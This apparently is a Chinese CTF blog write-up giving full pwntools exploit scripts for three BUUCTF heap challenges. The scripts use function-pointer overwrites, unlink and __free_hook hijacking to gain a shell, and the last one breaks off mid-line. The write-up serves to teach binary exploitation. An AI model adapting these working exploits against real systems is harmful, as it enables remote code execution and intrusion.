<h2 id="漏洞不明显"><a href="#漏洞不明显" class="headerlink" title="漏洞不明显"></a>漏洞不明显</h2><h3 id="inndy-notepad"><a href="#inndy-notepad" class="headerlink" title="inndy_notepad"></a>inndy_notepad</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#inndy_notepad">https://buuoj.cn/challenges#inndy_notepad</a><br>这个题漏洞是真他妈不明显 欸，要小心函数指针这种越界<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1662641374792-fca1ed2b-da4e-47ac-8c37-39c97eab5d4b.png#averageHue=%23fcfcfb&clientId=ud30324be-5815-4&from=paste&height=49&id=u0228a1a2&originHeight=74&originWidth=788&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7325&status=done&style=none&taskId=u3562b32a-bee3-4152-aff6-84df41bacbe&title=&width=525.3333333333334" alt="image.png"><br>如果v3&#x3D;&lt;1,那么就不是找的堆本身保存的两个函数指针，我们可以利用堆的连续性，在前面布置上恶意的函数指针，如free_plt,或者puts_plt,来达到free的效果，然后再搞成one_gagdet</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># from LibcSearcher import LibcSearcheronline</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># shell = ssh(host=&quot;node4.buuoj.cn&quot;, user=&quot;CTFMan&quot;, port=26682, password=&quot;guest&quot;)</span><br><span class="line"># shell.process</span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = &quot;./notepad&quot;</span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=&quot;debug&quot;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if &quot;2.23&quot; in libc.path:</span><br><span class="line">    one_gadget = [0x3A80C, 0x3A80E, 0x3A812, 0x3A819, 0x5F065, 0x5F066]</span><br><span class="line">elif &quot;2.27&quot; in libc.path:</span><br><span class="line">    one_gadget = [</span><br><span class="line">        0x3CBEA,</span><br><span class="line">        0x3CBEC,</span><br><span class="line">        0x3CBF0,</span><br><span class="line">        0x3CBF7,</span><br><span class="line">        0x6729F,</span><br><span class="line">        0x672A0,</span><br><span class="line">        0x13573E,</span><br><span class="line">        0x13573F,</span><br><span class="line">    ]</span><br><span class="line">else:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    remote_ip = &quot;node4.buuoj.cn&quot;</span><br><span class="line">    remote_port = 27250</span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line">else:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    global io</span><br><span class="line">    gdbscript = &quot;&quot;&quot;</span><br><span class="line">    b *0x8048CE8</span><br><span class="line">    c</span><br><span class="line">    x/10xw 0x804B080</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    sla(b&quot;::&gt; &quot;,b&quot;a&quot;)</span><br><span class="line">    sla(b&quot;size &gt; &quot;,str(size))</span><br><span class="line">    sla(b&quot;data &gt; &quot;,content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    sla(b&quot;::&gt; &quot;,b&quot;c&quot;)</span><br><span class="line">    sla(b&quot;id &gt; &quot;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sla(b&quot;::&gt; &quot;,b&quot;b&quot;)</span><br><span class="line">    sla(b&quot;id &gt; &quot;,str(index))</span><br><span class="line">    sla(b&quot;edit (Y/n)&quot;,b&quot;n&quot;)</span><br><span class="line">    sla(b&quot;::&gt; &quot;,b&quot;a&quot;)</span><br><span class="line"></span><br><span class="line">def read_only(index):</span><br><span class="line">    sla(b&quot;::&gt; &quot;,b&quot;d&quot;)</span><br><span class="line">    sla(b&quot;id &gt; &quot;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content,juece):</span><br><span class="line">    sla(b&quot;::&gt; &quot;,b&quot;b&quot;)</span><br><span class="line">    sla(b&quot;id &gt; &quot;,str(index))</span><br><span class="line">    sla(b&quot;edit (Y/n)&quot;,b&quot;Y&quot;)</span><br><span class="line">    sla(b&quot;content &gt; &quot;,content)</span><br><span class="line">    sla(b&quot;::&gt; &quot;,juece)</span><br><span class="line"></span><br><span class="line">def edit_twice(index,juece):</span><br><span class="line">    sla(b&quot;::&gt; &quot;,b&quot;b&quot;)</span><br><span class="line">    sla(b&quot;id &gt; &quot;,str(index))</span><br><span class="line">    sla(b&quot;::&gt; &quot;,juece)</span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = &quot;&quot;</span><br><span class="line">    for i in content:</span><br><span class="line">        out = hex(ord(i))[2:] + out</span><br><span class="line">    out = &quot;0x&quot; + out</span><br><span class="line">    return out</span><br><span class="line">sla(b&quot;::&gt; &quot;,b&quot;c&quot;)</span><br><span class="line"></span><br><span class="line">add(0x14,p32(elf.plt[&quot;free&quot;]))#0</span><br><span class="line">add(0x224,b&quot;a&quot;)#1</span><br><span class="line">add(0x14,b&quot;a&quot;)#2</span><br><span class="line"></span><br><span class="line">edit(1,b&quot;a&quot;,chr(ord(b&quot;a&quot;)-6))</span><br><span class="line">edit(0,p32(elf.plt[&quot;puts&quot;]),b&quot;a&quot;)</span><br><span class="line"></span><br><span class="line">edit_twice(1,chr(ord(b&quot;a&quot;)-6))</span><br><span class="line">libc_base=u32(ru(b&quot;\xf7&quot;))+0xf7d49000-0xf7ef97b0</span><br><span class="line">add(0x14,b&quot;a&quot;)#3</span><br><span class="line">add(0x14,b&quot;a&quot;)#4</span><br><span class="line">edit(3,p64(libc_base+one_gadget[0]),b&quot;a&quot;)</span><br><span class="line"></span><br><span class="line">edit(4,b&quot;a&quot;,chr(ord(b&quot;a&quot;)-6))</span><br><span class="line"></span><br><span class="line">#edit(0,b&quot;a&quot;*0x14)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h2 id="花式unlink"><a href="#花式unlink" class="headerlink" title="花式unlink"></a>花式unlink</h2><h3 id="ciscn-2019-en-5"><a href="#ciscn-2019-en-5" class="headerlink" title="ciscn_2019_en_5"></a>ciscn_2019_en_5</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./ciscn_2019_en_5&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4526A</span>, <span class="number">0x45216</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">27372</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *$rebase(0xe5c)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xg $rebase(0x202060)</span></span><br><span class="line"><span class="string">    x/10xg $rebase(0x202100)</span></span><br><span class="line"><span class="string">    x/xg $rebase(0x2021A0)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#<span class="number">7</span><span class="number">-512</span></span><br><span class="line">def add(size,content):</span><br><span class="line">    sla(b<span class="string">&quot;choice&gt; &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;length&gt; &quot;</span>,str(size))</span><br><span class="line">    sa(b<span class="string">&quot;content&gt; &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line">#清零了</span><br><span class="line">def free(index):</span><br><span class="line">    sla(b<span class="string">&quot;choice&gt; &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;index&gt; &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sla(b<span class="string">&quot;choice&gt; &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;index&gt; &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"># def edit(index,content):</span><br><span class="line">#     sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">#     sla(b<span class="string">&quot;book to write?&quot;</span>,str(index))</span><br><span class="line">#     sa(b<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># def convert_str_asmencode(content: str):</span><br><span class="line">#     out = <span class="string">&quot;&quot;</span></span><br><span class="line">#     <span class="keyword">for</span> i in content:</span><br><span class="line">#         out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">#     out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">#     <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(b<span class="string">&quot;name&gt; &quot;</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">24</span>)</span><br><span class="line"><span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x98</span>,b<span class="string">&quot;a\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(<span class="number">3</span>+i)</span><br><span class="line"><span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="number">2</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,b<span class="string">&quot;a\n&quot;</span>)#<span class="number">0</span></span><br><span class="line">add(<span class="number">0x78</span>,b<span class="string">&quot;a\n&quot;</span>)#<span class="number">1</span></span><br><span class="line">add(<span class="number">0x58</span>,b<span class="string">&quot;a\n&quot;</span>)#<span class="number">3</span></span><br><span class="line"></span><br><span class="line">#这里如果一次拿完，就会导致prev_inuse为不为<span class="number">1</span>，后续free会报错，这个块先会被放到tcache,这里会把下一块prev_inuse设为<span class="number">1</span>，但从tcache里面拿不会修改这个块的prev_inuse位</span><br><span class="line">#但是如果大小不是完全一样，这里由于是last_remainder,所以会进行切割，这里会set_header,prev_inuse,因为glibc认为如果last_remainder的前面一块是free的，那么一定会合并，如果没有合并说明前面一定是inuse</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x78</span>,b<span class="string">&quot;a\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(<span class="number">4</span>+i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,b<span class="string">&quot;a\n&quot;</span>)#如果add78就会分配到tcache里面去</span><br><span class="line">add(<span class="number">0x38</span>,b<span class="string">&quot;a\n&quot;</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">libc_base=u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))+<span class="number">0x7f0bd60d2000</span><span class="number">-0x7f0bd64bdca0</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="number">20</span><span class="number">-4</span>):</span><br><span class="line">    add(<span class="number">0x48</span>,b<span class="string">&quot;a\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>,b<span class="string">&quot;/bin/sh||&quot;</span>.ljust(<span class="number">0x20</span>,b<span class="string">&quot;a&quot;</span>)+p64(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">sla(b<span class="string">&quot;choice&gt; &quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;remarks&gt; &quot;</span>,p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">it()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="堆分配地址受限"><a href="#堆分配地址受限" class="headerlink" title="堆分配地址受限"></a>堆分配地址受限</h2><h3 id="qwb2019-one"><a href="#qwb2019-one" class="headerlink" title="qwb2019_one"></a>qwb2019_one</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#qwb2019_one">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>这个题目是个好题，首先是strchr,如果是\x00,则会匹配到最后一个字节，然后替换造成越界</p>
<p>最开始我可以直接堆块重叠 double free但是由于会check分配的地址是不是在堆上，所以失败</p>
<p>这个题目可以泄露bss地址，那么就unlink，unlink可以让我们控制指针数组，达到任意地址写，并且不需要利用malloc</p>
<p>思路很好的题目，但是exp不太好看，因为要利用越界写fake chunk之类的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./one&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">26480</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *$rebase(0x111B)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/xg $rebase(0x203060)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">def add(content):</span><br><span class="line">    sla(b<span class="string">&quot;command&gt;&gt; \n&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Now, you can input your test string:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">#清零了</span><br><span class="line">def <span class="built_in">free</span>(index):</span><br><span class="line">    sla(b<span class="string">&quot;command&gt;&gt; \n&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Please give me the index of the string:\n&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sla(b<span class="string">&quot;command&gt;&gt; \n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Please give me the index of the string:\n&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,charr,content):</span><br><span class="line">    sla(b<span class="string">&quot;command&gt;&gt; \n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Please give me the index of the string:\n&quot;</span>,str(index))</span><br><span class="line">    sa(b<span class="string">&quot;Which char do you want to edit:\n&quot;</span>,charr)</span><br><span class="line">    sla(b<span class="string">&quot;What do you want to edit it into:\n&quot;</span>,content)</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">#泄露elf load addr</span><br><span class="line">sla(b<span class="string">&quot;command&gt;&gt; \n&quot;</span>, str(<span class="number">0x3124</span>))</span><br><span class="line">sla(b<span class="string">&quot;Do you want to use one?(Y/N)\n&quot;</span>,b<span class="string">&quot;Y&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;Here are 5 strings to be tested. Which one do you want to test?\n&quot;</span>,str(<span class="number">0x80000000</span>))</span><br><span class="line">ru(b<span class="string">&quot;The string:\n&quot;</span>)</span><br><span class="line">target_addr=u64(rld().ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> target_addr&lt;<span class="number">0x4030c0</span>:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0x11</span>):</span><br><span class="line">    add(b<span class="string">&quot;/bin/sh\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0x18</span>):</span><br><span class="line">    edit(<span class="number">0</span>,b<span class="string">&quot;\x00&quot;</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,b<span class="string">&quot;\x00&quot;</span>,b<span class="string">&quot;\x04&quot;</span>)</span><br><span class="line">edit(<span class="number">0</span>,b<span class="string">&quot;\x41\x00&quot;</span>,b<span class="string">&quot;\x40&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="number">0x38</span>):</span><br><span class="line">    edit(<span class="number">0</span>,b<span class="string">&quot;a\x00&quot;</span>,chr(ord(<span class="string">&#x27;a&#x27;</span>)+i+<span class="number">1</span>))</span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(target_addr<span class="number">-0x18</span>)+p64(target_addr<span class="number">-0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x30</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0x37</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    edit(<span class="number">0</span>,chr(ord(<span class="string">&#x27;a&#x27;</span>)+i+<span class="number">1</span>)+<span class="string">&quot;\x00&quot;</span>,p8(fake_chunk[i]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)<span class="meta">#unlink</span></span><br><span class="line">ptr=p64(target_addr<span class="number">-0x18</span>)</span><br><span class="line">target=p64(target_addr+<span class="number">0x8</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0x18</span>):</span><br><span class="line">    edit(<span class="number">0</span>,b<span class="string">&quot;\x00&quot;</span>,b<span class="string">&quot;\x01&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>):</span><br><span class="line">    edit(<span class="number">0</span>,p8(ptr[i])+b<span class="string">&quot;\x00&quot;</span>,p8(target[i]))</span><br><span class="line">load_addr=target_addr<span class="number">-0x2030c0</span></span><br><span class="line">puts_got=p64(elf.got[<span class="string">&quot;puts&quot;</span>]+load_addr)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">0</span>,b<span class="string">&quot;\x00&quot;</span>,p8(puts_got[i]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(b<span class="string">&quot;The string is:\n&quot;</span>)</span><br><span class="line">libc_base=u64(rld().ljust(<span class="number">8</span>,b<span 